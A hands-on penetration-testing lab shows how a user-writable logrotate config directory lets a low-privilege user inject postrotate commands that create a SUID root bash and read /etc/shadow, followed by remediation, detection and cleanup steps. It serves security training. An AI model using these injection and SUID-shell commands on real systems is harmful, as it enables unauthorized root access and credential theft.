# LAB: Logrotate Configuration Injection → Root

**Real-World Privilege Escalation**

---

## Scenario: Application Log Management

You are a penetration tester who has gained initial access to a Linux server as a low-privilege user (`developer`). Your goal is to escalate to root.

**Background:**
The sysadmin has configured logrotate to manage application logs. The logrotate configuration includes a user-writable directory for application-specific configs, and runs postrotate scripts.

**Your access:**
- SSH access as `developer`
- Write access to application log configuration
- No sudo privileges

**Your mission:**
Escalate from `developer` to `root` using only the access you have.

---

## Learning Objectives

By the end of this lab, you will be able to:

1. Understand how logrotate processes configuration files
2. Identify dangerous logrotate configurations
3. Exploit logrotate's postrotate scripts
4. Achieve root access through log rotation
5. Recognize configuration injection attack vectors

---

## PHASE 0 — Environment Setup (Instructor Only)

### Create the developer user

```bash
useradd -m -s /bin/bash developer
echo "developer:developer123" | chpasswd
```

### Create application log directory

```bash
mkdir -p /var/log/webapp
touch /var/log/webapp/app.log
chown -R developer:developer /var/log/webapp
chmod 755 /var/log/webapp
```

### Create a user-writable logrotate config directory

This simulates a common pattern where application teams can manage their own log rotation:

```bash
mkdir -p /etc/logrotate.d/apps
chown root:developer /etc/logrotate.d/apps
chmod 775 /etc/logrotate.d/apps
```

### Create a base logrotate config for the app

```bash
cat > /etc/logrotate.d/apps/webapp << 'EOF'
/var/log/webapp/*.log {
    daily
    rotate 7
    compress
    missingok
    notifempty
    create 644 developer developer
    postrotate
        # Reload application after rotation
        /bin/true
    endscript
}
EOF

chown developer:developer /etc/logrotate.d/apps/webapp
chmod 644 /etc/logrotate.d/apps/webapp
```

### Create a cron job to run logrotate frequently (for lab purposes)

```bash
cat > /etc/cron.d/logrotate-apps << 'EOF'
# Run logrotate every 5 minutes for lab demonstration
*/5 * * * * root /usr/sbin/logrotate /etc/logrotate.d/apps/webapp
EOF
chmod 644 /etc/cron.d/logrotate-apps
```

### Add some log content

```bash
echo "[$(date)] Application started" >> /var/log/webapp/app.log
echo "[$(date)] Processing request" >> /var/log/webapp/app.log
```

**Setup complete.** The environment mimics a real application server with delegated log management.

---

## PHASE 1 — Initial Access & Reconnaissance

### Log in as the attacker

```bash
su - developer
```

### Verify your privileges

```bash
id
sudo -l
```

**Expected:** No sudo access.

---

## PHASE 2 — Enumeration

### Check for writable configuration directories

```bash
find /etc -type d -writable 2>/dev/null
```

**Found:**
```
/etc/logrotate.d/apps
```

### Examine the directory

```bash
ls -la /etc/logrotate.d/apps/
```

**Observations:**
- Developer has write access
- Contains webapp logrotate config

### Examine the logrotate config

```bash
cat /etc/logrotate.d/apps/webapp
```

**Key observations:**
- Processes `/var/log/webapp/*.log`
- Has a `postrotate` script section
- **postrotate scripts run as root!**

### Check for cron jobs

```bash
cat /etc/cron.d/*
```

**Found:**
```
*/5 * * * * root /usr/sbin/logrotate /etc/logrotate.d/apps/webapp
```

---

## 🔴 STOP AND THINK

**Ask yourself:**

1. Can I modify the logrotate config? → **Yes**
2. Do postrotate scripts run as root? → **Yes**
3. Can I inject commands into postrotate? → **Yes**

**This is a logrotate configuration injection vulnerability.**

---

## PHASE 3 — Understanding the Attack

### How logrotate postrotate works

Logrotate's `postrotate` section runs shell commands after rotating logs. Since logrotate runs as root, **postrotate scripts also run as root**.

### Attack vectors

1. **Modify postrotate:** Inject commands into the postrotate section
2. **Create new config:** Add a new logrotate config file with malicious postrotate
3. **Symlink attack:** Create symlinks to sensitive files

### The attack chain

```
developer modifies logrotate config
    → Injects payload into postrotate
    → Root runs logrotate (via cron)
    → Log is rotated
    → postrotate script executes as root
    → Attacker code runs with root privileges
```

---

## PHASE 4 — Exploitation

### Modify the logrotate configuration

```bash
cat > /etc/logrotate.d/apps/webapp << 'EOF'
/var/log/webapp/*.log {
    daily
    rotate 7
    compress
    missingok
    notifempty
    create 644 developer developer
    postrotate
        # Original: Reload application
        /bin/true
        # INJECTED: Create SUID root shell
        cp /bin/bash /tmp/rootbash
        chmod 4755 /tmp/rootbash
        echo "Pwned at $(date)" > /tmp/pwned.txt
        chmod 644 /tmp/pwned.txt
    endscript
}
EOF
```

### Force log rotation

Logrotate typically checks if files need rotation. To force it:

```bash
# Add content to log to trigger rotation
echo "[$(date)] Forcing log rotation" >> /var/log/webapp/app.log
```

### Alternative: Create a new config file

```bash
cat > /etc/logrotate.d/apps/evil << 'EOF'
/var/log/webapp/app.log {
    size 1
    postrotate
        cp /bin/bash /tmp/rootbash
        chmod 4755 /tmp/rootbash
        echo "Pwned at $(date)" > /tmp/pwned.txt
    endscript
}
EOF
```

The `size 1` directive triggers rotation when the log is larger than 1 byte.

---

## PHASE 5 — Wait for Execution

### Option A: Wait for cron

```bash
watch -n 10 'ls -la /tmp/rootbash /tmp/pwned.txt 2>/dev/null'
```

### Option B: Instructor triggers manually

```bash
sudo /usr/sbin/logrotate -f /etc/logrotate.d/apps/webapp
```

The `-f` flag forces rotation regardless of whether it's needed.

### Verify execution

```bash
ls -la /tmp/rootbash
cat /tmp/pwned.txt
```

---

## PHASE 6 — Privilege Escalation Complete

### Execute the SUID shell

```bash
/tmp/rootbash -p
```

### Verify root access

```bash
id
whoami
cat /etc/shadow | head -3
```

---

## PHASE 7 — Post-Exploitation Analysis

### The attack chain

```
developer (uid=1001)
    │
    ├── Found writable /etc/logrotate.d/apps/
    ├── Discovered root runs logrotate on configs
    │
    ▼
Modified logrotate config
    │
    ├── Injected commands in postrotate
    │
    ▼
Root cron executed logrotate
    │
    ├── Log was rotated
    ├── postrotate script executed as root
    ├── SUID bash created
    │
    ▼
root (euid=0)
```

### What failed

| Layer | Failure |
|-------|---------|
| **Permissions** | Logrotate config directory writable by user |
| **Design** | User controls postrotate scripts |
| **Least Privilege** | No isolation of log rotation |

### The one-sentence summary

> **Root executed logrotate with user-controlled postrotate scripts.**

---

## REMEDIATION

### Fix 1: Protect logrotate configuration

```bash
# Remove user write access to config directory
chmod 755 /etc/logrotate.d/apps
chown root:root /etc/logrotate.d/apps/*
chmod 644 /etc/logrotate.d/apps/*
```

### Fix 2: Use dedicated log rotation user

```bash
# Don't run application logrotate as root
# Use systemd timers with specific user context
```

### Fix 3: Validate configuration files

```bash
# Before running logrotate, check config ownership
find /etc/logrotate.d/apps -not -user root -exec echo "ALERT: Non-root config: {}" \;
```

### Fix 4: Use SELinux/AppArmor

Confine logrotate to prevent executing arbitrary scripts in postrotate.

### Fix 5: Separate log rotation from application

```bash
# Use a central, root-managed logrotate config
# Don't allow applications to define their own postrotate scripts
```

---

## VULNERABILITY CLASSIFICATION

| Framework | Classification |
|-----------|----------------|
| **CWE** | CWE-78: OS Command Injection |
| **CWE** | CWE-732: Incorrect Permission Assignment |
| **MITRE ATT&CK** | T1053.003: Scheduled Task/Job: Cron |

---

## REAL-WORLD EXAMPLES

This vulnerability pattern appears in:

1. **Multi-tenant systems** — Shared log rotation with per-tenant configs
2. **Application deployment** — Apps with write access to their log configs
3. **Container orchestration** — Delegated log management

### CVE Example:
- **CVE-2016-1247** — nginx logrotate privilege escalation

---

## CLEANUP (Instructor)

```bash
pkill -u developer 2>/dev/null || true
userdel -r developer 2>/dev/null || true
rm -rf /etc/logrotate.d/apps
rm -f /etc/cron.d/logrotate-apps
rm -rf /var/log/webapp
rm -f /tmp/rootbash /tmp/pwned.txt
```

---

## STUDENT EXERCISES

### Exercise 1: Symlink Attack

Research how symlinks can be used with logrotate. Can you overwrite /etc/passwd?

### Exercise 2: State File Manipulation

Logrotate uses `/var/lib/logrotate/status`. What happens if you can modify it?

### Exercise 3: Detection

Write a script that detects:
- Non-root owned logrotate configs
- Writable logrotate config directories
- Suspicious postrotate commands
